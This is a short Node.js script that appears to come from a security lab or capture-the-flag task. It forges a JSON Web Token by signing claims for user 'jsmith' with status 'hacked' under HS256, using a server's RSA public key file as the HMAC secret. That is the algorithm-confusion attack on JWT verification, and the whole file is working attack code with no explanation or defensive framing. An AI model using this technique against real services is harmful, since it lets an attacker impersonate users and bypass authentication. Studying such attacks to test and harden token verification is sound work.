const jwt = require("jsonwebtoken");
const fs = require("fs");
let key = fs.readFileSync("public_key.pem", "utf8");
let token = jwt.sign({user_name:"jsmith", status: "hacked"}, key, {algorithm: 'HS256'})
console.log(token)

